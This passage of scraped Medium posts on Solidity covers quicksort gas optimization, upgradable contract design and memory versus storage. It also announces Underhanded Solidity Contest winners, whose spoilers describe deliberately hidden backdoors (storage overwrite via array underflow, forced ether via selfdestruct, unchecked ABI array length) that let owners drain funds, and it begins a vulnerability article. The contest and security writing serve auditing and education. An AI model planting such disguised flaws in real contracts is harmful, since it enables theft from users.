loop).Reading the Wikipedia article very carefully we stumble upon this insight from their own C example:Note that the code does not swap the integers passed immediately, but first checks if their addresses are distinct. This is because, if the addresses are equal, the algorithm will fold to a triple *x ^= *x resulting in zero.Ah. i and j or i+1 and high might be the same address in the array. Let\u2019s avoid that edge case:if (i != j) {  arr[uint(i)] ^= arr[uint(j)];  arr[uint(j)] ^= arr[uint(i)];  arr[uint(i)] ^= arr[uint(j)];}if (i+1 != high) {  arr[uint(i+1)] ^= arr[uint(high)];  arr[uint(high)] ^= arr[uint(i+1)];  arr[uint(i+1)] ^= arr[uint(high)];}Re-run our test:Wow! We just saved another 2,823,204 gas by using XOR swapping with unsigned integers.Wikipedia specifically calls out avoiding the usage of XOR swapping these days because modern compilers can detect simple swaps that are safe to optimize like this, and do so: does the Solidity compiler not do this? (spoiler: the article\u2019s ending might surprise you!)Let\u2019s keep looking at ways to simplify and optimize this Solidity implementation.Method callsDo we really need two separate methods to handle recursion and partitioning? No.Do method calls cost gas? Yes.Therefore, we should do what we can to limit the number of method calls needed for the EVM. This is the opposite of conventional programming style in which large functions should be broken up into smaller functions for ease of maintenance.There\u2019s no hard and fast rule about this, obviously \u2014 don\u2019t trust in black and white value judgments with code. In our case, with a code golf contest, and the fact that everything costs gas in the EVM, we want to limit the need for unnecessary things.If we can make the code understandable with comments, utilize a clean layout, and avoid nesting too deeply, then keeping invoked method counts low is the preference.Let\u2019s refactor the sort(uint[], int, int) method and integrate the contents of the partition function. To review, we\u2019re starting with:function sort(uint[] arr, int low, int high) internal pure {  if (low < high) {    int pi = partition(arr, low, high);    sort(arr, low, pi-1);    sort(arr, pi+1, high);  }}The line assigning the partition value is where we need to integrate the contents of the partition() method.All we really need to do here is update the variable names to be consistent:function sort(uint[] arr, int low, int high) internal pure {  if (low < high) {    int pivot = int(arr[uint(high)]);    int i = (low-1); // index of smaller element    for (int j = low; j < high; j++) {      if (int(arr[uint(j)]) <= pivot) {        i++;        if (i != j) {          arr[uint(i)] ^= arr[uint(j)];          arr[uint(j)] ^= arr[uint(i)];          arr[uint(i)] ^= arr[uint(j)];        }      }    }    if (i+1 != high) {      arr[uint(i+1)] ^= arr[uint(high)];      arr[uint(high)] ^= arr[uint(i+1)];      arr[uint(i+1)] ^= arr[uint(high)];    }    pivot = i + 1;    sort(arr, low, pivot-1);    sort(arr, pivot+1, high);  }}We\u2019ve updated the variable name pi to pivot and made sure the return value that partition() used to provide is accounted for in pivot = i + 1.Running the test again we receive a new gas cost of 4,367,460 \u2014 a savings of 21,460 gas. Nothing to write home about, but again a clear indication of the cost of internal method calls.Recurse Then Check, or Check Then Recurse?One thing that might stand out to the reader is that every time our sorting algorithm runs we immediately check to see if low is less than high. This means in the worst case if its not we still invoked a method call cost just to get to that conditional checkpoint.Let\u2019s refactor it to do the check before calling further iterations of the sorting method.function sort(uint[] arr, int low, int high) internal pure {  int pivot = int(arr[uint(high)]);  int i = (low-1); // index of smaller element  for (int j = low; j < high; j++) {    if (int(arr[uint(j)]) <= pivot) {      i++;      if (i != j) {        arr[uint(i)] ^= arr[uint(j)];        arr[uint(j)] ^= arr[uint(i)];        arr[uint(i)] ^= arr[uint(j)];      }    }  }  if (i+1 != high) {    arr[uint(i+1)] ^= arr[uint(high)];    arr[uint(high)] ^= arr[uint(i+1)];    arr[uint(i+1)] ^= arr[uint(high)];  }  pivot = i + 1;  if (low < pivot-1) {    sort(arr, low, pivot-1);  }  if (pivot+1 < high) {    sort(arr, pivot+1, high);  }}The most important segment is at the bottom: we can\u2019t compare low to high anymore because we\u2019re trying to base the new recursion on the pivots. So if we\u2019re going to avoid always invoking a recursion in favor of checking beforehand we need to do two new conditional checks matching the input of the recursion calls.That\u2019s a lot of code and it might make you suspicious that it will cost more to do this than leaving it the old way.When we compile and test, however, we don\u2019t know: test vector 0 now fails.It turns out that test vector 0 is an empty array. Ah. We can\u2019t operate on an empty array!A minor update to the contract\u2019s public interface, the sort(uint[]) method can fix this:if (input.length >= 2) {  sort(input, 0, int(input.length - 1));}We don\u2019t need to sort an empty array or an array with only one element, right?Re-running out test yields a new gas cost of 4,345,785 \u2014 a new savings of 21,675 gas. It appears that even with all of our \u201cextra\u201d code we\u2019ve managed to use even less gas than before.Can We Avoid So Many Casts?All over the place we\u2019re stuck using uint() and int() casts because we inherited a few subtraction operations from the Java example. Yet at no point are we ever subtracting more than 1 from the values. Can we refactor around this limitation?Let\u2019s start by just removing the casts and updating the indexing variables with unsigned integers. We\u2019ll have to update the method signatures and invocations as well:function sort(uint[] input) public pure returns(uint[]) {  if (input.length >= 2) {    sort(input, 0, input.length-1);  }  return input;  }function sort(uint[] arr, uint low, uint high) internal pure {  uint pivot = arr[high];  uint i = low - 1; // DANGER: Underflow?  for (uint j = low; j < high; j++) {    if (arr[j] <= pivot) {      i++;        if (i != j) {        arr[i] ^= arr[j];        arr[j] ^= arr[i];        arr[i] ^= arr[j];      }    }  }  if (i+1 != high) {    arr[i+1] ^= arr[high];    arr[high] ^= arr[i+1];    arr[i+1] ^= arr[high];  }  pivot = i + 1;  if (low < pivot-1) { // DANGER: Underflow?    sort(arr, low, pivot-1);  }  if (pivot+1 < high) {    sort(arr, pivot+1, high);  }}It does compile, but fails test vector 3: \u201cinvalid opcode.\u201d Is it accessing an non-existent array element? How can we account for the possible underflow error?One thought, again, is that we\u2019re only subtracting a single value of 1 from the numbers, so we could put a check on the actual underflowed value itself: 2\u00b2\u2075\u2076-1.Let\u2019s define a new class constant for the Sort contract:contract Sort {  uint constant UINT256_MAX = (2**256)-1;The idea here is that all uint are 256 bit unsigned integers (there are other packing types for integer values such as uint16 or uint192 if you so need them) and thus the max value is 2\u00b2\u2075\u2076-1. Since the max value of uint is zero minus one as well, we can use that as a sanity check value.Note: Unlike C with the limits.h library, there isn\u2019t a native UINT256_MAX constant already available in the Solidity language, as far as I know.Let\u2019s review the two possible danger spots:uint i = low - 1; // DANGER: Underflow?for (uint j = low; j < high; j++) {  if (arr[j] <= pivot) {    i++;    if (i != j) {      arr[i] ^= arr[j];      arr[j] ^= arr[i];      arr[i] ^= arr[j];    }  }}Even though low - 1 might be underflowed, all future operations increment it (to at least 0), and it\u2019s never used before the increment. This is fine, then.The next section is the conditional check before recursively calling the sorting method:if (low < pivot-1) { // DANGER: Underflow?  sort(arr, low, pivot-1);}Definitely a problem. If pivot is 0 then it\u2019ll absolutely underflow and the condition will always be true.The quick fix then is:if (pivot-1 != UINT256_MAX && low < pivot-1) { // Avoid underflow  sort(arr, low, pivot-1);}Now we just need to re-run our test: 4,363,648 gas. Wait. Did we just use 17,863 more gas than the version with all the castings just because we\u2019re having to do an additional conditional check?What if we split up the conditional check?if (pivot-1 != UINT256_MAX) {  if (low < pivot-1) { // DANGER: Underflow?    sort(arr, low, pivot-1);  }}That yields 4,361,398 gas, better, still worse than the casting version \u2014 but did you notice that splitting up the conditional actually has an effect on gas cost?Solidity compiler: what manner of madness is this?!Meanwhile, some of you may be screaming back at the article: just compare with 0 then, if you\u2019re so worried about underflow!Ah. So you see the fatal flaw now? We over-complicated the situation without a real reason. We could much more easily say:if (pivot > 0 && low < pivot-1) {  sort(arr, low, pivot-1);}Gas cost with pivot > 0 instead of the UINT256_MAX check: 4,359,625.Splitting it up again:if (pivot > 0) {  if (low < pivot-1) {    sort(arr, low, pivot-1);  }}This final version costs 4,357,375 gas. This is still 11,590 gas more than the previous version using casts of uint and int.The peril of premature optimization: we need to look elsewhere, the casts are not the efficiency problem. We can\u2019t seem to avoid casts after all.Reviewing the AlgorithmWe\u2019re now stepping beyond the Java -> Solidity conversion questions and into the realm of \u201cwhat\u2019s the best way to use the Quicksort algorithm for these test cases.\u201dThe majority of this article has focused on a straightforward adaptation of an existing algorithm to Solidity from Java. We made an assumption that the original algorithm was a good Quicksort implementation.We made an assumption. Was it true?To review, this version uses the high value to set the pivot. What is that actually doing under the hood?If I have a set of integers like [5, 4, 6, 1, 2] then the iteration and transformations must look like this:low = 0, high = 4pivot = 2i = -1j = 0j is less than 4arr[j] is 55 is not less than or equal to 2 (pivot)j = 1j is less than 4arr[j] is 44 is not less than or equal to 2 (pivot)j = 2j is less than 4arr[j] is 66 is not less than or equal to 2 (pivot)j = 3arr[j] is 11 is less than 2 (pivot)i = 01 does not equal 3swap arr[i] and arr[j][1, 4, 6, 5, 2]j = 4i+1 = 11 does not equal 2swap arr[i+1] and arr[high][1, 2, 6, 5, 4]pivot = 1sort(arr, 0, 1)sort(arr, 2, 4)The impression I have there is than because we\u2019re always choosing high as the pivot, we\u2019re consistently going to have poor performance with the way it moves forward with huge second sorts and tiny, useless first sorts; it reminds me of Bubble Sort \u2014 not great average case performance.From the MiddleWe\u2019re not the only ones who\u2019ve ever asked ourselves how to write an efficient Quicksort in Solidity. In fact, there\u2019s an excellent version by Subhod I on Github that uses a middle pivot for Quicksort.Is his version faster than our pivot from the highest value? It sure looks clean.pragma solidity ^0.4.18;contract QuickSort {      function sort(uint[] data) public pure returns(uint[]) {    quickSort(data, int(0), int(data.length - 1));    return data;  }      function quickSort(uint[] memory arr, int left, int right) internal pure {    int i = left;    int j = right;    if(i==j) return;    uint pivot = arr[uint(left + (right - left) / 2)];    while (i <= j) {      while (arr[uint(i)] < pivot) i++;      while (pivot < arr[uint(j)]) j--;      if (i <= j) {        (arr[uint(i)], arr[uint(j)]) = (arr[uint(j)], arr[uint(i)]);        i++;        j--;      }    }        if (left < j)      quickSort(arr, left, j);    if (i < right)      quickSort(arr, i, right);  }}Wow: 1,151,833 gas!Pivoting in the middle saved us 3,193,952 gas versus the naive Java -> Solidity implementation, even after our various optimizations!But look, the author of the snippet above is still using the in-place value swap construct (arr[uint(i)], arr[uint(j)]) = (arr[uint(j)], arr[uint(i)]);.We proved earlier that the XOR swap was more efficient, right?Let\u2019s implement our special, optimized version of Subhod\u2019s algorithm then:Surely this one will be the best!Total gas cost: 1,237,550.\u2026So it\u2019s worse by 85,717 gas. Our little trick that worked so well with the previous algorithm was completely useless (and worse!) in this already well-implemented version.Which was more important then, all of these attempts at optimizations, or checking our assumptions at the door and deciding on the right algorithm the first time?What Have We LearnedHopefully we\u2019ve learned a few things:Some basic syntax differences between Java and SoliditySolidity method signatures and return valuesSimple gotchas and danger areas with indexes and boundariesAvoiding pre-mature optimizations, and focusing on algorithm choices firstDouble-checking assumptions: XOR shift and the Geeks for Geeks algorithm looked good on the surface, until we established a test case to compare againstThe Solidity compiler handles conditional checks differently than you might have expected (lower gas cost by nesting conditions)Avoiding casts isn\u2019t always necessaryMethod calls have a measurable costOver-complicated conditions (2\u00b2\u2075\u2076-1 instead of > 0) have a measurable costJust remember, look for established patterns first so you have benchmarks to compare against. And good luck golfing!", "responses": 5, "tags": ["Programming", "Ethereum", "Solidity", "Bitcoin", "Blockchain"]}, {"title": "Ethereum and Solidity: The Complete Developer\u2019s Guide \u2014 New Course!", "post_link": "https://codeburst.io/ethereum-and-solidity-the-complete-developers-guide-new-course-2fb2d669cd9d?source=search_post", "author_name": "Brandon Morelli", "author_link": "https://codeburst.io/@bmorelli25", "publish_date": "2018-01-09", "last_modified_date": "2018-06-10", "readtime": "2.70", "claps": 772, "voters": 152, "content": "Ethereum and Solidity: The Complete Developer\u2019s Guide \u2014 New Course!Use Ethereum, Solidity, and Smart Contracts to build production-ready apps based on the blockchainBrandon MorelliFollowJan 9, 2018 \u00b7 3 min readA lot of you know that Stephen Grider is one of my favorite online instructors when it comes to learning Web Development. Well, he\u2019s just released a new course!Check out his course below that will teach you how to use Ethereum, Solidity, and Smart Contracts to build production-ready apps based on the blockchain!Disclosure: I write reviews and receive compensation from the companies whose products I review. I have experience with every course below, and I only recommend the best. All opinions expressed here are my own.Ethereum and Solidity: The Complete Developer\u2019s Guide197 Lectures || 20 Hours of VideoEthereum and Solidity: The Complete Developer\u2019s GuideStephen Grider typically teaches React JS. He has created 15 courses teaching React and has over 161,000 enrolled students across the world! He knows not only how to create great content \u2014 but also how to be a great instructor. He recently released a new course on a new topic: Ethereum and Solidity: The Complete Developer\u2019s Guide.This course focuses on Smart Contracts and coding JavaScript for the the Ethereum Blockchain. Whether you\u2019re a programmer looking to leverage blockchain technology for advanced applications, or an engineer who simply wants to understand Ethereum and how to build apps with it \u2014 this is the course for you. The only prerequisites for this course are basic knowledge of Javascript and NPM.Stephen built this course because even though Blockchain technology is booming right now, most resources make it very difficult to understand exactly what a blockchain is. On top of that, there are very few resources that teach you how to build apps with them. So that\u2019s the purpose of this course: to be the best resource online for learning about Ethereum, blockchains, and how to build apps with this new technology.Click here to learn more or to sign up!Here\u2019s what Stephen has to say about the course:I can\u2019t overstate it enough; this course will show you the best and most easily repeatable patterns for creating production-ready apps with Ethereum.What tools and libraries are used?The Ethereum tech ecosystem is in constant change. This course will teach you how to assemble your own boilerplate package to develop, compile, and test Smart Contracts. By learning the core technologies, you\u2019ll be prepared to adjust to Ethereum no matter how the ecosystem changes.What is Ethereum?Ethereum is a cryptocurrency much like Bitcoin, and it has been heralded as Bitcoins successor. Whereas Bitcoin currently has issues scaling with an increasing backlog of transactions, Ethereum is poised to surpass Bitcoin in performance, popularity, and value. Ethereum was created to help developers like you create applications focused around transferring money or value from one party to another.What is Solidity?Solidity is a programming language for writing Smart Contracts. Essentially, think of it as a way to control a bank account with code. With Solidity, we can write applications that simulate a crowd funding campaign, a lottery, a loan, or any other type of financial instrument. Don\u2019t be intimidated by learning \u2018another\u2019 programming language; Solidity is known to be quite similar to Javascript and exceptionally easy to pick up for anyone who has previous JS experience. This course will give you all the tools you need to master Solidity.Click here to learn more or to sign up!Interested in other topics? I strongly recommend these courses too:Learn Node JSLearn React JSLearn CSSLearn Full Stack Web DevelopmentIf this post was helpful, please click the clap \ud83d\udc4fbutton below a few times to show your support! \u2b07\u2b07", "responses": 1, "tags": ["Ethereum", "JavaScript", "Web Development", "Technology", "Blockchain"]}, {"title": "Upgradable Solidity Contract Design", "post_link": "https://medium.com/rocket-pool/upgradable-solidity-contract-design-54789205276d?source=search_post", "author_name": "David Rugendyke", "author_link": "https://medium.com/@darcius", "publish_date": "2017-11-21", "last_modified_date": "2018-06-20", "readtime": "6.61", "claps": 984, "voters": 150, "content": "Upgradable Solidity Contract DesignEternal Storage + Hub and Spoke Topology = \u2665David RugendykeFollowNov 21, 2017 \u00b7 7 min readEthereum contracts are an amazing invention; autonomous immutable code that can act as judge, jury and executioner for a plethora of different services. Once deployed to the Ethereum blockchain though, they are essentially set in stone. This means if a serious bug or issue appears and your contracts aren\u2019t designed in a way that will allow them to be upgraded in your Dapp seamlessly, you might be glad you bought that 5 pack of brown underpants.260 Million ReasonsThere\u2019s a treasure trove of reasons, hacks and careless coding that has led to the loss of over $260 million worth of ether in recent years. Two of the most prominent were the DAO hack which lost approximately $60 million and the much more recent Parity Multisig Wallet hack that resulted in approximately $162 million worth of ether and tokens being stuck in limbo for a possible eternity on the blockchain.Not all of these incidents could have been prevented by making the contracts upgradable as some of them were only detected after the damage had been done. The biggest one though and most recent, the Parity Multisig Wallet hack, certainly could have been fixed in no time had it not been for this hard coded library contract address in the multisig wallet at line 451\u2026// FIELDSaddress constant _walletLibrary = 0x863df6bfa4469f3ead0be8f9f2aae51c91a907b4;Yeouch! Without any way to modify the address of that library contract, all other contracts that rely on it are now effected by any issue with it\u2026 and that\u2019s exactly what happened.address _walletLibrary = 0x863df6bfa4469f3ead0be8f9f2aae51c91a907b4;/// @dev Set a new wallet library contract addressfunction setLibraryAddress(address _newAddress) external onlyOwner {      _walletLibrary = _newAddress;}Adding just one extra function to the multisig wallet that lets the owner of the wallet update the address of that library contract would have made the issue just a mere squeak instead of the lions roar it turned into.Our ApproachWhile designing and building Rocket Pool a complex multi-contract Dapp, there were two main design choices that were made early on.All main contracts must be upgradable.Have a flexible, yet simple way to store data permanently.The first one is fairly self-explanatory, all contracts must be upgradable within the network. If we have an issue with one contract, its address needs to be editable so that we can replace the bugged contract with a new copy of it sans bugs and all other contracts in the Dapp must now communicate with the new version. Ok that sounds great! But what a lot of new developers don\u2019t realise is that any data that bugged contract was storing on itself is now gone\u2026Imagine if you had a contract called Users.sol that maintains a list of all the users that sign up to your Dapp, but it turns out Users.sol has a major bug, your developer Harry rushes to replace that bugged contract with a new one and in doing so, he deploys a new fixed Users.sol and updates the address of it so that all contracts in your Dapp now talk to the fixed contract. Harry is super happy, proud he fixed it so quick and soon to be wishing he also bought a 5 pack of brown underpants.As what Harry is soon to realise is that contract storage cannot be so easily replaced, he\u2019s just fixed the bug in Users.sol code and all contracts in your Dapp now talk to the new fixed contract, but all records of their users in the Dapp are gone, instead stuck in the old contracts storage\u2026 oops.The second goal is then to create a way to isolate your datastore from your contracts and make it as flexible as possible so that it is unlikely to ever warrant upgrading.Eternal StorageWhile researching various storage techniques for the Ethereum blockchain, I came across an article by Elena from Colony on Eternal Storage. This is a relatively old article now, but this article details building a simple single contract that stores all permanent data that your Dapp needs. Many of you may recognise this storage technique as key / value pair storage, a simple and extensible way to store any kind of data from simple values, to arrays and complex object type data.When Elena wrote this article, it was not possible for another contract to use a few of the methods in her storage contract, such as:function setStringValue(bytes32 record, string value)This was due to the fact that sending data with a variable length (strings, arrays) was not possible at the time between contracts. With the most recent hardfork that occurred just recently in October as phase one of the Metropolis upgrade to the Ethereum network, this is now possible.Rocket StorageBelow is an updated version of the original Eternal Storage that is now used for storing any persistent data in Rocket Pool.Rocket Pools Eternal Storage ContractTo keep things simple, there is a single modifier that restricts access to the set and delete methods. It will only allow the owner of the storage contract to access these methods directly to set some initial contract addresses during deployment, after deployment their access is removed to ensure only visible contract methods can write to storage. From then on, only registered contracts within the Rocket Pool network can write to storage.You could modify this to suit whatever needs you have with restricting access to who/what can write or delete from storage. If you were to add more than one though, I would look at adding an access content layer contract that contained the required permissions so that the storage contract remains as simple as possible, it should after all, never need upgrading.Isolating this to its own simple contract means that you can upgrade any other contract in your Dapp and retain any storage you need by storing it in your datastore contract.Hub and Spoke Topology DesignAlright, we\u2019ve now got a dedicated persistent storage contract, woohoo! The next step is to use that storage contract as a hub in our Dapp. If you\u2019ve ever been in the networking world, you will no doubt be familiar with the hub and spoke topology. This is a technique where all communications are routed through a single entity. Since our storage contract will never need upgrading, we always know where it will be, so let\u2019s use that as our Dapps contract hub.All contract to contract communications are done through the main storage hub.Now let\u2019s say we have a Dapp with 3 contracts, Users.sol, Organisations.sol and Storage.sol. The Users.sol contract will now store the Dapps users on Storage.sol, not itself like in the example with poor Harry. This means if it is upgraded, all current users will remain in the Dapp and not be lost on the buggy contract.Users.sol will also need to access the Organisations.sol contract periodically to find out what organisation a particular user belongs to. Instead of the User.sol contract communicating directly with the Organisation.sol contract in a standard approach, it will now ask the Storage.sol (Hub) contract for the address of the Organisation.sol contract, when it receives this address, it then communicates with the Organisation.sol contract using the address provided by Storage.sol.What this does is it allows us to replace the address of the Organisation.sol contracts address any time it needs upgrading, when the new upgraded contract is deployed, we simply update the address in the Storage.sol (Hub) with the new address of the upgraded Organisation.sol and the next time the User.sol contract needs to communicate with Organisation.sol, it will get the address of the newly upgraded contract. This allows for a seamless upgrade, no brown underpants needed.How to store and read contract addresses in the hubIt\u2019s quite simple to store a contract address in the hub, it\u2019s just a storage contract after all. When Rocket Pool is deployed through truffle, it automatically registers all contract addresses in the network with the hub upon deployment. Below is an example contract of how to register a contract name and address with the hub + how to read the address of another contract from the hub before communicating with that contract.Example Solidity contract for setting a contract address and reading one from storage.BenefitsThere\u2019s many benefits to creating a storage and hub system like this for your Dapp, the two biggest benefits in my eyes are:Flexibility. You can add whole new contracts to your Dapp with various data types and structures that can all be stored in the storage contract without ever needing to upgrade it.Security / Upgrades. If bugs are found, you can whip out the old contract, deploy a new one without losing any persistent storage and that new contract will automatically be used instantly by every contract in your Dapp.Underpants. You might not need to buy anymore 5 packs of brown underpants for deploying / upgrading Dapps. Unless you really like brown underpants, then knock yourself out.DrawbacksOf course no solution is perfect when it comes to these types of new age platforms. The main drawbacks we\u2019ve encountered so far are:Contract size on deployment will increase due to hashing of data required by the storage contract. This will be an issue when deploying contracts, especially really big contracts that are already near the gas block limit.Extra calls. Since inter-contract communication is now done through the hub, this results in an extra call. Same for storing and retrieving general data from the storage contract.Complexity. It will add some extra complexity to your Dapp.I never intended to make a graphic of a 5 pack of underpants, and yet here we are\u2026ConclusionThere are loads of ways to create upgradable contracts in Ethereum, this is just our favourite and a combination of two existing techniques that we\u2019ve found through our experience to be really great at providing a simple, flexible and upgradable path for any Dapp. We\u2019ve only touched on the surface here of whats possible, for a much more thorough view, please checkout the Rocket Pool Github.", "responses": 11, "tags": ["Ethereum", "Smart Contracts", "Solidity", "Blockchain", "Programming"]}, {"title": "Ethereum Solidity: Memory vs Storage & How to initialize an array inside a struct", "post_link": "https://medium.com/loom-network/ethereum-solidity-memory-vs-storage-how-to-initialize-an-array-inside-a-struct-184baf6aa2eb?source=search_post", "author_name": "Georgios Konstantopoulos", "author_link": "https://medium.com/@gakonst", "publish_date": "2018-02-13", "last_modified_date": "2019-08-19", "readtime": "2.60", "claps": 1348, "voters": 143, "content": "Ethereum Solidity: Memory vs Storage & How to initialize an array inside a structGeorgios KonstantopoulosFollowFeb 13, 2018 \u00b7 3 min readIn Loom Network\u2019s Telegram (which has ~8,000 members!) people ask questions on various topics such as Loom\u2019s roadmap, theoretical blockchain and Ethereum questions, and Solidity troubleshooting.There was a specific question that was asked, which involved initializing an array inside a struct. The person who asked it then provided their code, wondering why it does not work. I could not think of an answer of the top of my head so I decided to talk about this topic briefly in a post.The not-working code can be found below. I encourage you try finding a solution by yourself (you\u2019ve been practicing on CryptoZombies all this time, haven\u2019t you?).Read on to find the answer.Wrong CodeIt should be noted that in the above fiddle, the keyword memory is needed when declaring the variable room. If it was declared as Room room, the compiler would return the following error:TypeError: Type struct StructArrayInitWrong.Room memory is not implicitly convertible to expected type struct StructArrayInitWrong.Room storage pointer.Some theoryA contract\u2019s storage variables are the ones which define your contract\u2019s state and are only changed by sendTransaction calls[1].memory variables are temporary variables that exist only inside the calling function (they cannot be declared outside of one). They get wiped after the function exits and they are generally cheaper to use than storage variables \u2014 more details on gas costs here.Let\u2019s go through an example in order to understand how a storage variable can be used in a function in order to affect a contract\u2019s state.In the below fiddle, a copy of x gets passed in g() as and thus the state variable x will remain unmodified after execution (this is why we use the pure keyword.On the other hand, y in h() is declared as storage, which means that x is passed by reference. As a result, the state variable x is modified after the call to h().You can test the result by calling f() and then inspecting the value of y[2]. Even though g() is called after h(), it does not modify the state variable\u2019s value.Enough theorizing, let\u2019s get to the answer to the initial question.As we are unable to initialize the players array when initializing the structure, we are forced to do this in steps:Initialize the room structure to default values with an empty players array \u2014 as described here and in this fiddle.Push the room to the rooms array.Push msg.sender to the last room\u2019s players array (rooms.length-1 always refers to the last element in an array).Working Code Fiddle below:getRoomPlayers added for debugging. Test succesful initialization with getRoomPlayers(0)The trick here is that new address[](0) allocates memory for an empty array of addresses. After the initialization, the room gets added to rooms and is now part of a storage variable. This allows us to operate on the array players and push values to it.Note: If we did a new uint[](8) we would get an array of 8 zeros. You can test it in this fiddle.That\u2019s all for today, hope we cleared some misunderstandings regarding storage/memory and how to use them in your functions. Let us know about your questions on our Telegram channel, and if they cannot be answered in a few messages we will dedicate a post on it (or maybe a CryptoZombies lesson!)Loom Network is the blockchain platform of choice for serious dapp developers \u2014 the Universal Layer 2 that provides developers the tools they need to build functional user-facing dapps today.New to Loom? Start here.Want to stake your LOOM tokens and help secure Loom Network? Find out how.And if you enjoyed this article and want to stay in the loop, go ahead and sign up for our private mailing list.", "responses": 3, "tags": ["Ethereum", "Blockchain", "Programming", "Smart Contracts", "Solidity"]}, {"title": "Announcing the winners of the first Underhanded Solidity Coding Contest", "post_link": "https://medium.com/@weka/announcing-the-winners-of-the-first-underhanded-solidity-coding-contest-282563a87079?source=search_post", "author_name": "Nick Johnson", "author_link": "https://medium.com/@weka", "publish_date": "2017-09-21", "last_modified_date": "2018-05-20", "readtime": "4.27", "claps": 1025, "voters": 137, "content": "Announcing the winners of the first Underhanded Solidity Coding ContestNick JohnsonFollowSep 21, 2017 \u00b7 5 min readAfter much deliberation, the judgements are in, and we\u2019re finally able to announce the three winners of the first Underhanded Solidity Coding Contest. We received 23 qualifying entries in total, and the average quality was very high. Thanks again to everyone who submitted!All the submissions are now available on Github; note that the README in each contains spoilers provided by the author, so if you want to figure things out for yourself, be sure to read that last.Without any further ado, the winners:Honorable Mention: Doug HoyteDoug\u2019s entry implements a fairly standard token funding contract, with a bug that lets the owner manipulate the contract\u2019s storage in unexpected ways.Feedback from the judges was that while the nature of the exploit was very clever, the bug that enabled it is fairly obvious to an auditor (though easily deniable as a simple mistake), and the \u2018unused\u2019 code looked suspicious. With some refinement of the way the bug was disguised, this could have been a truly devious entry.We have decided to award a fourth place prize to Doug; for his prize, he will receive 10 MLN tokens.Doug\u2019s writeup in the readme is comprehensive and well worth a read, going into great depth about the subtleties of Solidity and the EVM that enable the exploit.SPOILERSThe contract features a storage array whose length field can be decremented below 0. This causes an arithmetic overflow, effectively disabling Solidity\u2019s array bounds checking. As a result, after the overflow writes to the array can be used to overwrite any storage element located after the array \u2014 including all mappings!Third Place: Jo\u00e3o CarvalhoJo\u00e3o\u2019s entry implements a dutch auction crowdsale as a price discovery mechanism for selling tokens. Give the contract a look over if you\u2019d like to figure out the flaws yourself.For his prize, Jo\u00e3o received a ticket to DevCon 3. Thanks to the Ethereum Foundation for contributing this prize!SPOILERSAlthough the fallback function captures funds sent to the contract the regular way, the fallback isn\u2019t the only way to send funds to a contract. A selfdestruct by another contract can target the fallback, and result in sending funds without executing any code. This can cause the dutch auction to end early, artificially inflating the token price.Here\u2019s what the judges had to say about Jo\u00e3o\u2019s entry:YudiExternal update to the balance to manipulate price+ Clean, hard to trace back to the team- Fairly complexChrisThe submission exploits an often overlooked edge case in the EVM and is thus a good submission per se, but there are much shorter submissions for the same edge case where the problem is equally well \u201chidden\u201d.Matthewvery good \u2014 i like the selfdestruct transfer technique, though ways that it can be used is restricted and requires somewhat unusual functionalitySecond Place: Richard MooreRichard\u2019s entry implements a standard token contract with a small variation: the owner may only withdraw the raised funds gradually \u2014 1 ether in the first week, 2 in the second, 4 in the third, and so forth. Stop here and give the contract a read yourself if you want to figure out where the deviousness lies.For his prize, Richard received a flight to Lyon and lunch with the iExec team. Thanks to iExec for sponsoring this prize!SPOILERSThe increasing schedule of payouts is accomplished by subtracting the remaining balance from the total supply of tokens. Since the fallback function always increases the total supply when it receives ether, this seems fine \u2014 only, the fallback function isn\u2019t the only way to fund a contract.As in Jo\u00e3o\u2019s entry, it\u2019s possible to send funds to a contract without running its fallback function, by selfdestructing another contract with the token contract as a target address. As demonstrated by Richard\u2019s tests, it\u2019s also possible to prefund the contract before deploying it. Once either of these has happened, the subtraction will cause an overflow, allowing the owner to withdraw as much as they want.Here\u2019s what the judges have to say about Richard\u2019s entry:YudiExternal update to the balance to underflow max withdrawal amount+ Short, clean, can be dismissed as a coder oversight- Overflow/Underflow issue is relatively easy to noticeChrisNice exploit of something that is not directly visible in the program, but code could be shorter.Matthewcute exploit, fixed by safemath but i like the trigger being funding it before the contract is deployedFirst Place: Martin SwendeMartin\u2019s entry implements a \u2018round table\u2019 for governance, and raises funds by allowing people to bid on seats around the table. A \u2018small honorarium\u2019 is paid out to the creator of the contract for each bid. I highly recommend reading his code and trying to figure out for yourself where the flaw is.For his prize, Martin agreed to present his solution at DevCon 3 this November.SPOILERSThe \u2018small honorarium\u2019 sometimes turns out to be not quite so small. Martin makes use of the fact that Solidity does not validate that the ABI-encoded length of an array matches the length of the payload. He jumps through a couple of plausible-seeming hoops to avoid referencing the length directly when processing bids \u2014 except when he increments the honorarium. As a result, the owner of the contract can submit a specially crafted bid that inflates the amount of the honorarium arbitrarily, and allows them to withdraw all the funds supplied by other users to their own account.Here\u2019s what the judges had to say about Martin\u2019s entry:YudiExploiting dynamic array length+ Short, clean, can be dismissed as a coder error, I like the theme :) - Seems a bit overly complex (no need for a loop), doesn\u2019t actually check msg.value against the bidsChristianBonus points for actually taking a look at compiled code.Suspicious that seats.length == bids.length is checked, but not seats.length == NO_OF_SEATS_BIDRelies on the fact that the ABI decoder does not check for overflows, but still: The actual problem is that bids.length is assumed to equal NO_OF_SEATS_BID but this assumption is not checked anywhere, the overflow only helps in executing the exploit.MatthewImpressive understanding of ABI and how solidity handles its own type structures, probably would not have caught the intention in an audit even though i may have caught the bug, also really like the fact that it allows the owner to act in a way where he may not even have to use the bugWrapping UpA huge thanks to everyone who submitted, and especially to our hardworking judges, who had to read and rate over 20 deliberately difficult to audit contracts. Look out for a new USCC, with a new theme, next year!", "responses": 4, "tags": ["Ethereum", "Uscc", "Solidity", "Blockchain"]}, {"title": "How to Secure Your Smart Contracts: 6 Solidity Vulnerabilities and how to avoid them (Part 2)", "post_link": "https://medium.com/loom-network/how-to-secure-your-smart-contracts-6-solidity-vulnerabilities-and-how-to-avoid-them-part-2-730db0aa4834?source=search_post", "author_name": "Georgios Konstantopoulos", "author_link": "https://medium.com/@gakonst", "publish_date": "2018-01-17", "last_modified_date": "2019-08-19", "readtime": "4.00", "claps": 1122, "voters": 128, "content": "How to Secure Your Smart Contracts: 6 Solidity Vulnerabilities and how to avoid them (Part 2)Georgios KonstantopoulosFollowJan 17, 2018 \u00b7 5 min readWhile Part 1 discussed some more high profile or obvious vulnerabilities, this post will be about vulnerabilities that have not been exploited widely yet.Let\u2019s skip the introduction and jump straight to them:4. Forcing ether to a contractSolidity\u2019s selfdestruct does two things.It renders the contract useless, effectively deleting the bytecode at that address.It sends all the contract\u2019s funds to a target address.The special case here, is that if the receiving address is a contract, its fallback function does not get executed.This means that if a contract\u2019s function has a conditional statement that depends on that contract\u2019s 